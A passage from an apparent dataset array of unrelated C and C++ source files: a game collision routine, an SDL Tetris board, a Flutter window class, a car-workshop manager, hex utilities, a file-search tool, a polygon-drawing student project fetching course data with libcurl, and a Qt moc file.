&m_Matrix);\n\n\tm_pMeshClimb->Render(0xff0000ff); // \ud30c\ub780\uc0c9..\n}\n\n/*\n#ifdef _N3TOOL\nBOOL CN3TransformCollision::CheckClimb(__Vector3 &vPos, __Vector3 &vDir, __Vector3* pVCol, __Vector3* pVNormal, __Vector3* pVPolygon)\n{\n\tif(NULL == m_pMeshClimb) return FALSE;\n\t\n\tint nIC = m_pMeshClimb->IndexCount();\n\tint nFC = 0;\n\tif(nIC > 0)\n\t{\n\t\tnFC = nIC / 3; // Face Count\n\t}\n\telse\n\t{\n\t\tnFC = m_pMeshClimb->VertexCount() / 3;\n\t}\n\tif(nFC <= 0) return FALSE;\n\n\tfloat t,u,v;\n\t__Vector3 vSrc[3];\n\n\tif(nIC > 0)\n\t{\n\t\tWORD* pwIndices = m_pMeshClimb->Indices();\n\t\t__Vector3* pVSrc = m_pMeshClimb->Vertices();\n\t\tfor(int i = 0; i < nFC; i++)\n\t\t{\n\t\t\tvSrc[0] = pVSrc[pwIndices[i*3+0]] * m_Matrix;\n\t\t\tvSrc[1] = pVSrc[pwIndices[i*3+1]] * m_Matrix;\n\t\t\tvSrc[2] = pVSrc[pwIndices[i*3+2]] * m_Matrix;\n\n\t\t\tif(TRUE == ::IntersectTriangle(vPos, vDir, vSrc[0], vSrc[1], vSrc[2], t, u, v)) \n\t\t\t{\n\t\t\t\tif(pVCol) *pVCol = (vDir * t) + vPos;\n\t\t\t\tif(pVNormal) { pVNormal->Cross(vSrc[1] - vSrc[0], vSrc[2] - vSrc[0]); pVNormal->Normalize(); }\n\t\t\t\tif(pVPolygon)\n\t\t\t\t{\n\t\t\t\t\tpVPolygon[0] = vSrc[0];\n\t\t\t\t\tpVPolygon[1] = vSrc[1];\n\t\t\t\t\tpVPolygon[2] = vSrc[2];\n\t\t\t\t}\n\t\t\t\treturn TRUE;\n\t\t\t}\n\t\t}\n\t}\n\telse\n\t{\n\t\t__Vector3* pVSrc = m_pMeshClimb->Vertices();\n\t\tfor(int i = ",
    "#include \"../headers/board.h\"\n#include \"../headers/GetTexture.h\"\n#include \"../headers/Tetromino.h\"\n#include <SDL2/SDL.h>\n#include <SDL2/SDL_image.h>\n#include <SDL2/SDL_ttf.h>\n#include <ctime>\n#include <string>\n\nBoard::Board(SDL_Renderer *Renderer, Menu *mainMenu) {\n  BLOCKSIZE = 50;\n  boardHeight = BLOCKSIZE * 20;\n  boardWidth = BLOCKSIZE * 10;\n  VERTICALSHIFT = 40;\n  HORIZONTALSHIFT = 710;\n  INITIAL_X = 910;\n  INITIAL_Y = 40;\n  renderer = Renderer;\n  grid = {HORIZONTALSHIFT, VERTICALSHIFT, boardWidth, boardHeight};\n  bg = {0, 0, 1920, 1080};\n  background = GetTexture(renderer, \"./assets/img/background.png\");\n  gridBackground = GetTexture(renderer, \"./assets/img/grid.png\");\n  baseTile = GetTexture(renderer, \"./assets/img/block.png\");\n  tetrominoTile = GetTexture(renderer, \"assets/img/block.png\");\n  nextTetrominoTile = GetTexture(renderer, \"assets/img/block.png\");\n  textColor = {255, 255, 255, 255};\n  kanit = TTF_OpenFont(\"assets/fonts/Kanit-Bold.ttf\", 45);\n  menu = mainMenu;\n  level = 1;\n  score = 0;\n  totalLinesCleared = 0;\n\n  for (int i = 0; i < 20; i++) {\n    for (int j = 0; j < 10; j++) {\n      valueGrid[i][j] = 0;\n      visibleGrid[i][j] = {HORIZONTALSHIFT + (j * BLOCKSIZE),\n                           VERTICALSHIFT + (i * BLOCKSIZE), BLOCKSIZE,\n                           BLOCKSIZE};\n    }\n  }\n}\n\nBoard::~Board() {\n  SDL_DestroyTexture(gridBackground);\n  SDL_DestroyTexture(baseTile);\n  SDL_DestroyTexture(tetrominoTile);\n  SDL_DestroyTexture(nextTetrominoTile);\n  SDL_DestroyTexture(background);\n  TTF_CloseFont(kanit);\n  gridBackground = NULL;\n  baseTile = NULL;\n  tetrominoTile = NULL;\n  nextTetrominoTile = NULL;\n  background = NULL;\n  kanit = NULL;\n};\n\nmenuState Board::game() {\n  SDL_Event e;\n  bool quit = false;\n  Uint64 currentTicks;\n  const SDL_Point INITIAL_POS1 = {INITIAL_X, INITIAL_Y};\n  const SDL_Point INITIAL_POS2 = {INITIAL_X, INITIAL_Y + BLOCKSIZE};\n  SDL_Point nextPos;\n  SDL_Point NEXT_POS1 = {HORIZONTALSHIFT + boardWidth + BLOCKSIZE * 2,\n                         VERTICALSHIFT + BLOCKSIZE * 4 + 20};\n  SDL_Point NEXT_POS2 = {HORIZONTALSHIFT + boardWidth + BLOCKSIZE * 2,\n                         VERTICALSHIFT + BLOCKSIZE * 5 + 20};\n  SDL_Rect currentTetromino[4];\n  SDL_Point pos;\n  menuState currentState = playState;\n\n  Tetromino t(renderer, BLOCKSIZE, tetrominoTile);\n  Tetromino next(renderer, BLOCKSIZE, nextTetrominoTile);\n  shape current = t.random();\n  shape nextPiece = next.random();\n\n  if (current == L_Shape || current == J_Shape || current == T_Shape ||\n      nextPiece == L_Shape || nextPiece == J_Shape || nextPiece == T_Shape) {\n    pos = INITIAL_POS2;\n    nextPos = NEXT_POS2;\n  } else {\n    pos = INITIAL_POS1;\n    nextPos = NEXT_POS1;\n  }\n\n  t.update(pos, t.random(), currentTetromino);\n  next.update(nextPos, nextPiece, currentTetromino);\n\n  while (!quit) {\n    if (currentState == playState) {\n      while (SDL_PollEvent(&e)) {\n        if (e.type == SDL_KEYDOWN) {\n          if (e.key.keysym.sym == SDLK_SPACE) {\n            t.rotate(currentTetromino);\n            if (collisionBlocks(currentTetromino)) {\n              t.rotate(currentTetromino);\n              t.rotate(currentTetromino);\n              t.rotate(currentTetromino);\n            }\n          } else if (e.key.keysym.sym == SDLK_LEFT) {\n            if (!outOfLeftBounds(currentTetromino)) {\n              pos.x -= 50;\n              t.update(pos, currentTetromino);\n              if (collisionBlocks(currentTetromino)) {\n                pos.x += 50;\n                t.update(pos, currentTetromino);\n              }\n            }\n          } else if (e.key.keysym.sym == SDLK_RIGHT) {\n            if (!outOfRightBounds(currentTetromino)) {\n              pos.x += 50;\n              t.update(pos, currentTetromino);\n              if (collisionBlocks(currentTetromino)) {\n                pos.x -= 50;\n                t.update(pos, currentTetromino);\n              }\n            }\n          } else if (e.key.keysym.sym == SDLK_DOWN) {\n            pos.y += BLOCKSIZE;\n            t.update(pos, currentTetromino);\n\n            if (collisionBlocks(currentTetromino)) {\n              pos.y -= BLOCKSIZE;\n              t.update(pos, currentTetromino);\n              insert(currentTetromino, t.getShape(), &quit);\n              lineClear();\n\n              if (nextPiece == L_Shape || nextPiece == J_Shape ||\n                  nextPiece == T_Shape) {\n                pos = INITIAL_POS2;\n              } else {\n                pos = INITIAL_POS1;\n              }\n\n              t.update(pos, nextPiece, currentTetromino);\n              nextPiece = next.random();\n\n              if (nextPiece == L_Shape || nextPiece == J_Shape ||\n                  nextPiece == T_Shape) {\n                nextPos = NEXT_POS2;\n              } else {\n                nextPos = NEXT_POS1;\n              }\n\n              next.update(nextPos, nextPiece, currentTetromino);\n            }\n          } else if (e.key.keysym.sym == SDLK_UP) {\n            bool drop = true;\n            while (drop) {\n       ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"../../include/Atelier/functiiAtelier.h\"\n\nvectorMasiniPoz getLocLiber(Angajat *const *vec, const unsigned int &preferintaAngajat, const typeMasini &tipMasina) {\n    switch (tipMasina)\n    {\n        case tipSTANDARD: {\n            if(vec[preferintaAngajat]->getUnixIntrariAtelier((int)MASINA1) == 0) {\n                return MASINA1;\n            }\n            else if(vec[preferintaAngajat]->getUnixIntrariAtelier((int)MASINA2) == 0) {\n                return MASINA2;\n            }\n            else if(vec[preferintaAngajat]->getUnixIntrariAtelier((int)MASINA3) == 0) {\n                return MASINA3;\n            }\n            break;\n        }\n\n        case tipAUTOBUZ: {\n            if(vec[preferintaAngajat]->getUnixIntrariAtelier((int)AUTOBUZ) == 0) {\n                return AUTOBUZ;\n            }\n            break;\n        }\n\n        case tipCAMION: {\n            if(vec[preferintaAngajat]->getUnixIntrariAtelier((int)CAMION) == 0) {\n                return CAMION;\n            }\n            break;\n        }\n        \n        default:\n            break;\n    }\n\n    return vectorNULL;  \n}\n\nshort nouaMasinaInAtelier() {\n    Angajat **vec = nullptr;\n    unsigned int nrAngajati = 0;\n\n    typeMasini tipMasina = tipNULL;\n    citesteAngajatiJSON(vec, nrAngajati);\n\n    sendInfo(\"Urmeaza sa adaugi o masina noua in atelier!\");\n    sendInfo(\"Pentru a continua, este nevoie de tipul masinii\\nTipuri de masini dispinibile:\\n\\t standard \\t|\\t autobuz \\t|\\t camion\");\n    \n    string tip;\n    do {\n        citesteValoare(\"Introdu tipul masinii\");\n        cin >> tip;\n        tipMasina = stringToTypeMasina(tip);\n        if(stringToTypeMasina(tip) == tipNULL) {\n            sendError(\"Tipul masinii introdus nu este corect!\");\n            sendInfo(\"Tipuri de masini dispinibile:\\n\\t standard \\t|\\t autobuz \\t|\\t camion\");\n        }\n    } while(stringToTypeMasina(tip) == tipNULL);\n\n\n    Masina *masina = citesteMasina(tip);\n\n    char preferinta;\n    int preferintaAngajat = -2;\n    sendQuestion(\"Doresti ca masina sa fie adaugata la un anumit angajat?\");\n    sendInfo(\"Y - Da \\t|\\t N - Nu\");\n\n    do {\n        cin >> preferinta;\n        if(preferinta == 'Y' || preferinta == 'y') {\n            clearChat();\n            sendInfo(\"Alege angajatul la care vrei sa fie adaugata masina:\");\n            for(unsigned int i = 0; i < nrAngajati; i++) {\n                cout << \"\\t\" << vec[i]->getIdAngajat() << \" -> \" << vec[i]->getNume() << \" \" << vec[i]->getPrenume() << endl;\n            }\n\n            do {\n                citesteValoare(\"Introdu ID-ul angajatului\");\n                cin >> preferintaAngajat;\n                if(preferintaAngajat >= (int)nrAngajati) {\n                    sendError(\"Angajatul ales nu exista!\");\n                }\n            } while(!(existaIdAngajat(vec, nrAngajati, preferintaAngajat)));\n\n        } else if(preferinta == 'N' || preferinta == 'n') {\n            preferintaAngajat = -1;\n\n        } else {\n            sendError(\"Optiunea aleasa nu este corecta!\");\n        }\n    } while(preferintaAngajat == -2);\n    \n    if(preferintaAngajat != -1) {\n        vectorMasiniPoz loc = getLocLiber(vec, preferintaAngajat, tipMasina);\n        if(loc != vectorNULL) {\n            int zile = 0;\n            citesteValoare(\"Introdu numarul de zile pana cand masina va fi scoasa din atelier\");\n            cin >> zile;\n            long long timeUnix = ZileToUnix(zile);\n            vec[preferintaAngajat]->setUnixIntrariAtelier((int)loc, timeUnix);\n            \n            double bacsis = masina->getPolita() * 0.01;\n            intrareInAtelier(vec[preferintaAngajat], masina, timeUnix, true, false, bacsis);\n            sendSuccess(\"Masina a fost adaugata cu succes la angajatul ales!\");\n            salveazaAngajatiToJson(vec, nrAngajati);\n            return 1;\n        }\n        else if(loc == vectorNULL) {\n            sendError(\"Angajatul ales nu are locuri disponibile pentru masina de tipul ales!\");\n            sendInfo(\"Doresti ca sistemul sa aleaga un angajat, sau doresti sa ramai in lsita de asteptare pentru angajatul ales!\\n\\t1 - Alege un angajat automat \\t|\\t 2 - Ramai in lista de asteptare pentru angajatul ales\");\n            citesteValoare(\"Introdu optiunea\");\n            unsigned short int dorinta = 0;\n            do {\n                cin >> dorinta;\n                if(dorinta > 2) {\n                    clearChat();\n                    sendError(\"Optiunea aleasa nu este corecta!\\n\\t1 - Alege un angajat automat \\t|\\t 2 - Ramai in lista de asteptare pentru angajatul ales \\t|\\t 0 - Nu adauga masina\");\n                    citesteValoare(\"Introdu optiunea\");\n                }\n            } while(dorinta > 2);\n\n            if(dorinta == 1) {\n                for(unsigned int i = 0; i < nrAngajati; i++) {\n                    vectorMasiniPoz loc = getLocLiber(vec, i, tipMasina);\n                    if(loc != vectorNULL) {\n                        int zile = 0;\n                        citesteValoare(\"Introdu numarul de zile pana cand masina va fi scoas",
    "#include \"KittyUtils.h\"\n\nstatic void xtrim(std::string &hex){\n    if(hex.compare(0, 2, \"0x\") == 0){\n        hex.erase(0, 2);\n    }\n\n    // https://www.techiedelight.com/remove-whitespaces-string-cpp/\n    hex.erase(std::remove_if(hex.begin(), hex.end(), [](char c){\n\t\t\t\t\t\t\t\treturn (c == ' ' || c == '\\n' || c == '\\r' ||\n\t\t\t\t\t\t\t\t\t\tc == '\\t' || c == '\\v' || c == '\\f');\n\t\t\t\t\t\t\t}),\n\t\t\t\t\t\t\thex.end());\n}\n\n\nbool KittyUtils::validateHexString(std::string &xstr){\n    if(xstr.length() < 2) return false;\n    xtrim(xstr); // first remove spaces\n    if(xstr.length() % 2 != 0) return false;\n    for(size_t i = 0; i < xstr.length(); i++){\n        if(!std::isxdigit((unsigned char)xstr[i])){\n            return false;\n        }\n    }\n    return true;\n}\n\n\n// https://tweex.net/post/c-anything-tofrom-a-hex-string/\n#include <sstream>\n#include <iomanip>\n\n\n// ------------------------------------------------------------------\n/*!\n    Convert a block of data to a hex string\n*/\nvoid KittyUtils::toHex(\n    void *const data,           //!< Data to convert\n    const size_t dataLength,    //!< Length of the data to convert\n    std::string &dest           //!< Destination string\n    )\n{\n    unsigned char     *byteData = reinterpret_cast<unsigned char*>(data);\n    std::stringstream hexStringStream;\n    \n    hexStringStream << std::hex << std::setfill('0');\n    for(size_t index = 0; index < dataLength; ++index)\n        hexStringStream << std::setw(2) << static_cast<int>(byteData[index]);\n    dest = hexStringStream.str();\n}\n\n\n// ------------------------------------------------------------------\n/*!\n    Convert a hex string to a block of data\n*/\nvoid KittyUtils::fromHex(\n    const std::string &in,     //!< Input hex string\n    void *const data           //!< Data store\n    )\n{\n    size_t          length    = in.length();\n    unsigned char   *byteData = reinterpret_cast<unsigned char*>(data);\n    \n    std::stringstream hexStringStream; hexStringStream >> std::hex;\n    for(size_t strIndex = 0, dataIndex = 0; strIndex < length; ++dataIndex)\n    {\n        // Read out and convert the string two characters at a time\n        const char tmpStr[3] = { in[strIndex++], in[strIndex++], 0 };\n\n        // Reset and fill the string stream\n        hexStringStream.clear();\n        hexStringStream.str(tmpStr);\n\n        // Do the conversion\n        int tmpValue = 0;\n        hexStringStream >> tmpValue;\n        byteData[dataIndex] = static_cast<unsigned char>(tmpValue);\n    }\n}",
    "#include <iostream>\n#include <string>\n#include <filesystem>\n#include <vector>\n#include <thread>\n#include <chrono>\n#include <ctime>\nusing namespace std;\nint num = 0;\nbool active = true;\nstring sword = \"your file\";\nstring path = \"your searching path\";\nfloat timeout = 666.0;\nvector<string> exceptions = {\"sys\", \".speech-dispatcher\", \".wine\", \"llvm-14\", \"proc\", \"X11\", \"steam\", \"z:\"};\nvector<string> results;\nvoid checker(){\n    float timet = 0;\n    while(active){\n        this_thread::sleep_for(0.1s);\n        timet += 0.1;\n        if(timet >= timeout){\n            active = false;\n            break;\n        }\n    }\n}\nstring mlower(string str){\n    for(char & stabe : str){\n        stabe = tolower(stabe);\n    }\n    return str;\n}\nbool check_it(string inp, vector<string> inplist){\n    bool h = true;\n    for(string element : inplist){\n        if(mlower(element) == mlower(inp)){\n            return false;\n            h = false;\n            break;\n        }\n    }\n    if(h){return true;}\n}\nvector<string> split_str(string tos, char del){\n    vector<string> re;\n    string h;\n    for(auto& stabe : tos){\n        if(stabe != del){\n        h = h + stabe;}\n        else if(stabe == del){\n            re.push_back(h);\n            h = \"\";\n        }\n    }\n    if(tos[tos.size()] != del){\n        re.push_back(h);\n    }\n    return re;\n}\nstring wend(string str){\n    vector<string> sstr = split_str(str, '.');\n    return sstr[0];\n}\nvoid search_folder(string folder){\n    if(active){\n        try{\n    vector<string> files;\n    vector<string> folders;\n    for (const auto & entry : filesystem::directory_iterator(folder))\n        if(filesystem::is_regular_file(entry)){\n             files.push_back(entry.path().c_str());\n        }\n        else if(filesystem::is_directory(entry)){\n             folders.push_back(entry.path().c_str());\n        }     \n    for(string fpath : files){\n        vector<string> filename  = split_str(fpath, '/');\n        if(mlower(wend(filename[filename.size()-1])) == mlower(wend(sword))){\n            results.push_back(fpath);\n        }\n        num++;\n    }\n    for(string folder : folders){\n        vector<string> foldername = split_str(folder, '/');\n        if(mlower(foldername[foldername.size()-1]) == mlower(wend(sword))){\n            results.push_back(folder);\n            cout<<folder<<endl;}   \n        if(check_it(foldername[foldername.size()-1], exceptions)){\n        search_folder(folder);}\n        cout<<\"\\033[1;35m\"+folder+\"\\033[0m\"<<endl;\n    } }\n    catch(...){\n        ;\n    }}\n}\nint main(){\n    time_t start = time(nullptr);\n    thread t1 = thread(checker);\n    t1.detach();\n    thread t2 = thread(search_folder, path);\n    t2.join();\n    active = false;\n    cout<<\"\\n\\n\\n\\033[1;31mResults:\\033[0m\\n\";\n    for(const string element: results){\n        cout<<\"\\033[1;32m    \"+element+\"\\033[0m\"<<endl;\n    }\n    cout<<\"\\n\";\n    cout<<\"\\033[1;31mEnded searching \"+to_string(num)+\" files \"+to_string(time(nullptr)-start)+\"secs\\033[0m\\n\";\n}\n",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <graphics.h>\r\n#include <math.h>\r\n#include <curl/curl.h>\r\n\r\nsize_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream); // curl \r\nvoid eksenciz(); // 2 boyutlu uzay duzlemini cizdiriyoruz\r\nchar* parcala(const char* str); //alinan verinin kullanilacak kismini belirliyor  \r\nint* sayilastir(char *a); //stringi integera ceviriyor\r\nint sekilsayisi(int* sayilar, int boyut,int *ay); // veride kac sekil oldugunu belirliyor\r\nvoid alanVeKareSayisiYazdir(int* coordinates, int size, float *topl,int* bks); // Alan ve Plartform degerlerini buluyor\r\nconst char* satir(const char* text, int line_number); // gelen veride secilen satiri donduruyor\r\nbool icindemi(int* polygon, int n, int x, int y); // birim karenin icersinde poligon bulunup bulunmadigini kontrol ediyor\r\nvoid platformbelirleme(int* polygon, int n); // plartformun oldugu kareleri griye boyuyor\r\nint platformSayisi(int* polygon, int n); // plartform sayisini donduruyor\r\n\r\nint main()\r\n{\r\n\t//Curl islemleri\r\n\tFILE *dosya;\r\n    CURL *curl;\r\n    CURLcode res;\r\n    long file_size;\r\n    int secim;\r\n\tfloat pMal; //plartform maliyeti\r\n\tint sMal; // sondaj maliyeti\r\n    curl = curl_easy_init();\r\n\r\n    if (curl) {\r\n        curl_easy_setopt(curl, CURLOPT_URL, \"http://abilgisayar.kocaeli.edu.tr/prolab1/prolab1.txt\");\r\n\r\n        dosya = fopen(\"yaz1.txt\", \"wb\");\r\n        if (!dosya) {\r\n            fprintf(stderr, \"Dosya a\u00e7ma hatas\u00fd\\n\");\r\n            return 1;\r\n        }\r\n\r\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);\r\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, dosya);\r\n\r\n        res = curl_easy_perform(curl);\r\n        fclose(dosya);\r\n\r\n        if (res != CURLE_OK) {\r\n            fprintf(stderr, \"cURL hatas\u00fd: %s\\n\", curl_easy_strerror(res));\r\n            curl_easy_cleanup(curl);\r\n            return 1;\r\n        }\r\n\t\tdosya = fopen(\"yaz1.txt\", \"r\");\r\n        fseek(dosya, 0, SEEK_END);\r\n        file_size = ftell(dosya);\r\n        rewind(dosya);\r\n\r\n        char metin[file_size + 1];\r\n        fread(metin, 1, file_size, dosya);\r\n        metin[file_size] = '\\0'; \r\n\t\tprintf(\"Cekilen veri:\\n%s\\n\\n\",metin);\r\n\t\t\r\n        printf(\"Hangi satiri cizdirmek istersiniz:\");\r\n        scanf(\"%d\", &secim);\r\n        \r\n        printf(\"\\nBirim Sondaj Maliyetini Giriniz (1-10):\");\r\n        scanf(\"%d\",&sMal);\r\n        \r\n        printf(\"\\nBirim Plartform Maliyetini Giriniz:\");\r\n        scanf(\"%f\",&pMal);\r\n        \r\n        const char* input_str = satir(metin, secim); // verideki secilen satiri input_str ye esitliyoruz \r\n\t\tprintf(\"\\nSecilen satir: %s\\n\", input_str);\r\n\t\r\n\t// input islemleri\r\n\tchar* dnm = parcala(input_str); // kullanilacak veriyi dnm ye esitle \r\n\tint* coord = sayilastir(dnm); // koordinat noktalarini integer sekilde coorda esitliyoruz\r\n\t\r\n\tint boyut= 0;\r\n\tfor(int i=0;coord[i] != '\\0';i++)\r\n\t{\r\n\t\tboyut++; // boyut bilgisi\r\n\t}\r\n\tfor(int i=0;coord[i] != '\\0';i++)\r\n\t{\r\n\t\tcoord[i] = coord[i] *16; // cizdirdi\u00f0imiz eksenin boyutlar\u00fdna uygun pikseldeki noktayi bulmak i\u00e7in 16 ile carpiyoruz \r\n\t}\r\n\tinitwindow(1920,1080); // pencere ac\r\n\tint ayrim; // iki sekil varsa ayrim indeksnin temsil eder\r\n\teksenciz();\r\n\tif(sekilsayisi(coord,boyut,&ayrim))\r\n\t{ \r\n\t\t//Tek Sekil varsa\r\n\tfloat toplmal=0;\r\n\tint birimks;\r\n \tsetfillstyle(1, RED);\r\n    fillpoly(boyut/2, coord);\r\n    alanVeKareSayisiYazdir(coord, boyut, &toplmal,&birimks);\r\n    platformbelirleme(coord, boyut);\r\n    \r\n    printf(\"\\nToplam Plartform Sayisi:%d\\n\",birimks);\r\n    \r\n    printf(\"\\nToplam Sondaj Maliyeti: %.2f\\n\", (float(sMal) * toplmal /10.0));\r\n    \r\n\tprintf(\"\\nToplam Plartform Maliyeti: %.2f\\n\", (pMal * float(birimks)));\r\n\t\r\n\tprintf(\"\\nToplam Maliyet: %.2f\\n\",((float(sMal) * toplmal /10.0) + (pMal * float(birimks))));\r\n\t\r\n\tprintf(\"\\nKar Miktari: %.2f\\n\", toplmal - ((float(sMal) * toplmal /10.0) + (pMal * float(birimks))));  \t\r\n\t\t\r\n\tsetfillstyle(1, RED);\r\n    fillpoly(boyut/2, coord);\r\n     \tchar floatStr[20];\r\n   \t \tsprintf(floatStr, \"%.2f\", toplmal);\r\n        \r\n        outtextxy(500, 20, \"Toplam Rezerv Deger:\");\r\n   \t\touttextxy(680, 20, floatStr);\r\n\t}\r\n\telse\r\n\t{\r\n\t\t// cift sekil varsa\r\n\t\tint* sekil1 = (int*)malloc((ayrim+2)* sizeof(int)); // sekil1 in koordinatlari icim bellekte alan tuttuk\r\n\t\tint* sekil2 = (int*)malloc( (boyut - ayrim)* sizeof(int)); //sekil2 nin koordinatlari icin bellekte alan tuttuk\r\n\t\tfloat toplam_alan = 0.0;\r\n\t\tfloat tAlan= 0.0;\r\n\t\tint i=0;\r\n\t\tint boyut1=0;\r\n\t\tint boyut2=0;\r\n\t\tint tPLart = 0; //toplam plartform sayisini verecek\r\n\t\tint toplam_plartf;\r\n\t\tfor(i=0;i <= ayrim;i++)\r\n\t\t{\r\n\t\t\tsekil1[i] = coord[i];\r\n\t\t\tboyut1++;\r\n\t\t}\r\n\t\tsekil1[i+1] = '\\0';\r\n\t\tfor(;coord[i] != '\\0';i++)\r\n\t\t{\r\n\t\t\tsekil2[boyut2] = coord[i];\r\n\t\t\tboyut2++;\r\n\t\t}\r\n\t\tsekil2[boyut2+1] = '\\0';\r\n\t\tsetfillstyle(1, RED);\r\n        fillpoly(boyut1/ 2, sekil1);\r\n        fillpoly(boyut2/ 2, sekil2);\r\n        //ilk sekilin kareleri\r\n        \r\n        alanVeKareSayisiYazdir(sekil1, boyut1,&toplam_alan,&toplam_plartf);\r\n        tAlan += toplam_alan;\r\n        t",
    "/****************************************************************************\n** Meta object code from reading C++ file 'desinerofbarbie.h'\n**\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.6.2)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include \"../../../BarbieProject/desinerofbarbie.h\"\n#include <QtCore/qmetatype.h>\n\n#if __has_include(<QtCore/qtmochelpers.h>)\n#include <QtCore/qtmochelpers.h>\n#else\nQT_BEGIN_MOC_NAMESPACE\n#endif\n\n\n#include <memory>\n\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'desinerofbarbie.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 68\n#error \"This file was generated using the moc from 6.6.2. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\n#ifndef Q_CONSTINIT\n#define Q_CONSTINIT\n#endif\n\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nQT_WARNING_DISABLE_GCC(\"-Wuseless-cast\")\nnamespace {\n\n#ifdef QT_MOC_HAS_STRINGDATA\nstruct qt_meta_stringdata_CLASSdesinerOfBarbieENDCLASS_t {};\nconstexpr auto qt_meta_stringdata_CLASSdesinerOfBarbieENDCLASS = QtMocHelpers::stringData(\n    \"desinerOfBarbie\"\n);\n#else  // !QT_MOC_HAS_STRING_DATA\nstruct qt_meta_stringdata_CLASSdesinerOfBarbieENDCLASS_t {\n    uint offsetsAndSizes[2];\n    char stringdata0[16];\n};\n#define QT_MOC_LITERAL(ofs, len) \\\n    uint(sizeof(qt_meta_stringdata_CLASSdesinerOfBarbieENDCLASS_t::offsetsAndSizes) + ofs), len \nQ_CONSTINIT static const qt_meta_stringdata_CLASSdesinerOfBarbieENDCLASS_t qt_meta_stringdata_CLASSdesinerOfBarbieENDCLASS = {\n    {\n        QT_MOC_LITERAL(0, 15)   // \"desinerOfBarbie\"\n    },\n    \"desinerOfBarbie\"\n};\n#undef QT_MOC_LITERAL\n#endif // !QT_MOC_HAS_STRING_DATA\n} // unnamed namespace\n\nQ_CONSTINIT static const uint qt_meta_data_CLASSdesinerOfBarbieENDCLASS[] = {\n\n // content:\n      12,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       0,    0, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       0,       // signalCount\n\n       0        // eod\n};\n\nQ_CONSTINIT const QMetaObject desinerOfBarbie::staticMetaObject = { {\n    QMetaObject::SuperData::link<QDialog::staticMetaObject>(),\n    qt_meta_stringdata_CLASSdesinerOfBarbieENDCLASS.offsetsAndSizes,\n    qt_meta_data_CLASSdesinerOfBarbieENDCLASS,\n    qt_static_metacall,\n    nullptr,\n    qt_incomplete_metaTypeArray<qt_meta_stringdata_CLASSdesinerOfBarbieENDCLASS_t,\n        // Q_OBJECT / Q_GADGET\n        QtPrivate::TypeAndForceComplete<desinerOfBarbie, std::true_type>\n    >,\n    nullptr\n} };\n\nvoid desinerOfBarbie::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    (void)_o;\n    (void)_id;\n    (void)_c;\n    (void)_a;\n}\n\nconst QMetaObject *desinerOfBarbie::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *desinerOfBarbie::qt_metacast(const char *_clname)\n{\n    if (!_clname) return nullptr;\n    if (!strcmp(_clname, qt_meta_stringdata_CLASSdesinerOfBarbieENDCLASS.stringdata0))\n        return static_cast<void*>(this);\n    return QDialog::qt_metacast(_clname);\n}\n\nint desinerOfBarbie::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\n{\n    _id = QDialog::qt_metacall(_c, _id, _a);\n    return _id;\n}\nQT_WARNING_POP\n",
